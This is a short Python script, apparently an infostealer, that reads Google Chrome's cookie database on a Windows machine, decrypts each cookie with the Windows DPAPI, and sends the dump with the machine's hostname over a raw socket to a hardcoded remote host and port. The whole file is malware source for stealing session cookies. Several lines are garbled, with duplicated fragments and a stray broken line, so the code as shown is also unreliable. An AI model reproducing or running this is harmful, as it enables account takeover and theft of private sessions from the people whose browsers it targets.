import os
import sqlite3
import win32crypt  # for decrypting cookies on windows
import socket
from datetime import datetime

def get_chrome_cookies():
    # path to chrome's cookie database (adjust if path differs)
    cookie_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
    if not os.path.exists(cookie_path):
        return "didnt find anythin in here mate"
    
    try:
        conn = sqlite3.connect(cookie_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = []
        
        for host, name, encrypted_value in cursor.fetchall():
            try:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
                cookies.append(f"Host: {host} | Name: {name}{name} | Value: {decrypted_value}")
{decrypted_value}")
            except:
                cookies.append(f"Host: {host}{host} | Name: {name}{name} | Value: [decryption failed]")
        
        conn.close()
        return "\n".join(cookies)
    except Exception as e:
        return f"error grabbing cookies: {str(e)}"

def send_to_receiver(data, host='172.19.128.1', port=12345):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        # include machine identifier (hostname) for tracking
        machine_id = socket.gethostname()
        sock.sendall(f"[{datetime.now()}] Cookie Dump from {machine_id}:\n{data}\{data}\n".encode())
        sock.close()
        return "cookies shipped to receiver, fam."
    except Exception as e:
        return f"delivery failed: {str(e)}"

if __name__ == "__main__":
    cookie_data = get_chrome_cookies()
    print(cookie_data)
    result = send_to_receiver(cookie_data)
    print(result)